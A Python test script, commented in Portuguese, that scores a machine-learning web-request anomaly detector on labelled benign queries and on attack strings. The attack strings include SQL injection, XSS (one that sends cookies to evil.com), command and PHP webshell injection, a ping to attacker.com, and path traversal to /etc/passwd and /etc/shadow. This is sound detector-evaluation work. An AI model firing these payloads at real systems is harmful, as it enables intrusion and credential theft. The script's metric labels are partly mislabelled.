import joblib, sys, argparse
from pathlib import Path
from ml_features_extraction_request import extract_features

# Resumo: Teste rápido de requisições benignas e malignas

# -----------------------
# Parsing de argumentos
# -----------------------

parser = argparse.ArgumentParser(description = "Teste básico para o modelo de detecção")

parser.add_argument(
    "-v","--version",
    type=str,
    default="99",
    help="Escolha da versão do modelo de detecção para testar"
)

parser.add_argument(
    "-i","--important",
    action="store_true",
    help="Utiliza modelos do diretório important_models, usados nos experimentos (padrão: false)"
)

parser.add_argument(
    "-n", "--numeric",
    action="store_true",
    help="Testa modelo SOMENTE com features numéricas (padrão: false)"
)

parser.add_argument(
    "-t", "--tfidf",
    action="store_true",
    help="Testa modelo SOMENTE com features textuais (tf-idf) (padrão: false)"
)

args = parser.parse_args()

# -----------------------
# Ajuste de Flags
# -----------------------

VERSION = args.version

if VERSION == "99": print("Necessário explicitar a versão do modelo para testar utilizando a flag " \
                  "-v ou --version. Use a flag --help ou veja o README para auxílio."); exit(1)

if (args.numeric and args.tfidf):
    print("ALERTA: Para testar modelo com ambas features numéricas e textuais não use flag -n e -t.")
    exit(1)

if(args.numeric):  FEATURE = "NUM"; print(f"- Testando modelo somente com features numéricas - ")
elif (args.tfidf): FEATURE = "TFI"; print(f"- Testando modelo somente com features textuais - ")
else:              FEATURE = "BTH"; print(f"- Testando modelo com features combinadas - ")


# -----------------------
# Diretorios
# -----------------------


SCRIPT_DIR = Path(__file__).resolve().parent

if(args.important): MODEL_PATH = SCRIPT_DIR / 'important_request_models'
else:               MODEL_PATH = SCRIPT_DIR / 'request_model_versions'

MODEL_ARCHIVE = MODEL_PATH / f"model{VERSION}.pkl"

if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

if not MODEL_ARCHIVE.exists():
    raise FileNotFoundError(f"Modelo não encontrado: {MODEL_ARCHIVE}")

# -----------------------
# Carregando Modelo
# -----------------------

model = joblib.load(MODEL_ARCHIVE)
vectorizer = joblib.load(MODEL_PATH / f"vectorizer{VERSION}.pkl")
scaler = joblib.load(MODEL_PATH / f"scaler{VERSION}.pkl")
method_encoder = joblib.load(MODEL_PATH / f"method_encoder{VERSION}.pkl")

model.verbose = False

# Variáveis auxiliares
number = 0
valid = 0
anomalous = 0

# -----------------
# Função Principal
# -----------------

def classify(method, request, label=""):

    global number, valid, anomalous

    X = extract_features(method, request, vectorizer, scaler, method_encoder, FEATURE)

    proba = model.predict_proba(X)

    prediction = model.predict(X)

    if(prediction == "Valid") or (prediction == 0):
        valid += 1
    else:
        anomalous += 1

    label_str = f"  [{label}]" if label else ""

    print(f"Predição {number:02d}{label_str}: {prediction}  \tProb: {proba}")

    number += 1


print("\nRequisições Anômalas:\n")

# --- SQL Injection ---
classify("GET",  "id=1+OR+1=1",                                                                      "SQLi  01 - OR 1=1 básico")
classify("GET",  "id=1+UNION+SELECT+password+FROM+users",                                            "SQLi  02 - UNION SELECT")
classify("POST", "username=admin'+OR+1=1--",                                                         "SQLi  03 - OR 1=1 com comentário")
classify("POST", "username=admin'+or+'1'='1",                                                        "SQLi  04 - or '1'='1'")
classify("POST", "username=admin'%20OR%201=1",                                                       "SQLi  05 - URL-encoded OR")
classify("GET",  "id=1;+DROP+TABLE+users--",                                                         "SQLi  06 - Stacked query DROP")
classify("GET",  "id=1'+AND+SLEEP(5)--",                                                             "SQLi  07 - Blind time-based")
classify("GET",  "search=1'+UNION+SELECT+null,table_name+FROM+information_schema.tables--",          "SQLi  08 - information_schema dump")
classify("POST", "login=admin'--&password=irrelevant",                                               "SQLi  09 - Comment termination")
classify("GET",  "q=1'+ORDER+BY+3--",                                                                "SQLi  10 - ORDER BY (column count)")
classify("GET",  "page=1+OR+1=1+LIMIT+1--",                                                         "SQLi  11 - OR 1=1 com LIMIT")
classify("GET",  "id=1+AND+1=2+UNION+SELECT+username,password+FROM+admin--",                        "SQLi  12 - False condition + UNION")
classify("POST", "email=test@test.com'+OR+'1'='1'--&password=anything",                             "SQLi  13 - OR em campo email")

print("\n------------------------------------------------------------------------------\n")

# --- XSS ---
classify("GET",  "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",                                                 "XSS   01 - script tag básico")
classify("GET",  "q=%3Cscript%3Ealert(1)%3C/script%3E",                                             "XSS   02 - script tag URL-encoded")
classify("GET",  "s=%3Cimg+src%3D%22invalid-image%22+onerror%3D%22alert%28%27XSS%27%29%22%3E",      "XSS   03 - img onerror encoded")
classify("GET",  "name=<svg+onload=alert(1)>",                                                       "XSS   04 - svg onload")
classify("GET",  "msg=<body+onload=alert('XSS')>",                                                   "XSS   05 - body onload")
classify("GET",  "redirect=javascript:alert(document.cookie)",                                       "XSS   06 - javascript: protocol")
classify("POST", "comment=<img+src=x+onerror=alert(1)>",                                             "XSS   07 - img onerror simples")
classify("GET",  "q=<a href=javascript:alert(1)>click</a>",                                         "XSS   08 - anchor javascript href")
classify("GET",  "input=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",                             "XSS   09 - double-encoded script")
classify("GET",  "search=<details+open+ontoggle=alert(1)>",                                          "XSS   10 - details ontoggle")
classify("POST", "bio=<script>document.location='http://evil.com/?c='+document.cookie</script>",    "XSS   11 - cookie exfiltration")

print("\n------------------------------------------------------------------------------\n")

# --- RCE ---
classify("GET",  "/../../../bin/sh",                                                                 "RCE   01 - path traversal /bin/sh")
classify("GET",  "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",    "RCE   02 - php://input wrapper")
classify("GET",  "cmd=cat+/etc/passwd",                                                              "RCE   03 - cat /etc/passwd")
classify("POST", "param=;+ls+-la",                                                                   "RCE   04 - shell injection ls")
classify("GET",  "file=php://filter/convert.base64-encode/resource=index.php",                      "RCE   05 - php://filter wrapper")
classify("GET",  "path=|cat+/etc/shadow",                                                            "RCE   06 - pipe injection")
classify("GET",  "cmd=ping+-c+4+attacker.com",                                                       "RCE   07 - ping exfiltration")
classify("POST", "upload=../../../var/www/shell.php",                                                "RCE   08 - webshell upload path")
classify("POST", "data=<?php+system($_GET['cmd']);+?>",                                              "RCE   09 - PHP system() injection")
classify("POST", "input=`whoami`",                                                                       "RCE   10 - backtick execution")

print("\n------------------------------------------------------------------------------\n")

# --- LFI ---
classify("GET",  "page=../../../etc/passwd",                                                         "LFI   01 - traversal básico")
classify("GET",  "file=../../../../etc/shadow",                                                      "LFI   02 - /etc/shadow")
classify("GET",  "path=..%2F..%2F..%2Fetc%2Fpasswd",                                                "LFI   03 - URL-encoded ../")
classify("GET",  "include=....//....//....//etc/passwd",                                             "LFI   04 - ....// bypass")
classify("GET",  "template=../../../../../boot.ini",                                                  "LFI   05 - Windows boot.ini")
classify("GET",  "lang=../../../windows/system32/drivers/etc/hosts",                                 "LFI   06 - Windows hosts file")
classify("GET",  "doc=..%25%32%66..%25%32%66..%25%32%66etc/passwd",                                  "LFI   07 - double URL-encoded")
classify("POST", "config=../apache/php/php.ini",                                                     "LFI   08 - php.ini via POST")
classify("GET",  "file=/proc/self/environ",                                                          "LFI   09 - /proc/self/environ")
classify("GET",  "view=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",                                    "LFI   10 - %2e%2e%2f encoded")

print(f"\n[TOTAL ATAQUES]: Falso Negativo = {valid} , Verdadeiro Negativo = {anomalous}, Taxa FN = {(valid/(valid+anomalous)):.4f}")

valid = 0
anomalous = 0

print("\nRequisições Válidas:\n")

# --- GET legítimo ---
classify("GET", "q=notebook",                                                                        "Válido 01 - busca simples")
classify("GET", "id=10&action=view",                                                                 "Válido 02 - id numérico + ação")
classify("GET", "search=sorvete+de+banana+com+canela",                                               "Válido 03 - busca com texto")
classify("GET", "login=True",                                                                        "Válido 04 - flag login")
classify("GET", "q=select+best+notebook",                                                            "Válido 05 - 'select' em busca benigna")
classify("GET", "category=eletronicos&sort=price_asc&page=2",                                       "Válido 06 - filtros de categoria")
classify("GET", "q=tenis+corrida&brand=Nike&min_price=200&max_price=800",                            "Válido 07 - busca com faixa de preço")
classify("GET", "search=mochila+escolar&title=Special%3ASearch",                                    "Válido 08 - Wikipedia search")
classify("GET", "nsCat=Natural&q=ps4&mi=hm_ger_mntop_G_jogos_ps4&psn=Menu_Top",                    "Válido 09 - Netshoes menu param")
classify("GET", "lang=en&modules=startup&only=scripts&raw=1&skin=vector-2022",                      "Válido 10 - Wikipedia JS loader")
classify("GET", "section_id=4403314556813&article_id=37985300408845",                               "Válido 11 - seção de artigo")
classify("GET", "mi=hm_ger_mntop_S-whey&psn=Menu_Top",                                              "Válido 12 - menu item Netshoes")
classify("GET", "sellerId=15401&promoted=true",                                                      "Válido 13 - filtro de vendedor")
classify("GET", "utf8=%E2%9C%93&query=fone+bluetooth",                                               "Válido 14 - busca com UTF-8")
classify("GET", "_desconto=21-99&mi=hm_ger_mntop_O-meias&psn=Menu_Top",                             "Válido 15 - filtro de desconto")
classify("GET", "q=script+movie+review&sort=newest&page=3",                                          "Válido 16 - 'script' em busca benigna")
classify("GET", "search=union+jack+flag+buy&category=clothing&color=red",                            "Válido 17 - 'union' em busca benigna")

# --- POST legítimo ---
classify("POST", "username=admin&password=abc",                                                      "Válido 18 - login simples")
classify("POST", "name=pedro&password=123",                                                          "Válido 19 - login com nome")
classify("POST", "username=administrator&password=administrator",                                    "Válido 20 - admin login")
classify("POST", "user=alert&email=jorge&pass=javascript",                                           "Válido 21 - 'alert'/'javascript' em campos benignos")
classify("POST", "email=juliana%40uol.com.br&password=P%40ssw0rd2024&remember=no",                  "Válido 22 - login com email encoded")
classify("POST", "first_name=Vinicius&last_name=Teixeira&email=eduardo%40outlook.com&cpf=939.628.761-81&phone=%2821%29+98279-5851&password=Secure%212024&gender=M", "Válido 23 - cadastro completo")
classify("POST", "q=select+carregador+portatil&category=brinquedos&sort=newest&min_price=201&max_price=1185&min_rating=0&condition=used", "Válido 24 - busca POST com 'select'")
classify("POST", "name=Priscila+Dias&email=user%40outlook.com&subject=return&order_id=PED-2024-69033&priority=low&message=O+produto+recebido+e+diferente", "Válido 25 - formulário de contato")
classify("POST", "post_id=42&post_type=product&author_name=Natalia&rating=5&title=Superou+minhas+expectativas&recommend=yes", "Válido 26 - avaliação de produto")
classify("POST", "category=smartphones&brand=apple&min_price=289&max_price=8095&availability=all&sort=price_asc&per_page=24", "Válido 27 - filtros de busca POST")

print(f"\n[TOTAL BENIGNO]: Falso Positivo = {anomalous} , Verdadeiro Positivo = {valid}, Taxa FN = {(anomalous/(valid+anomalous)):.4f}")

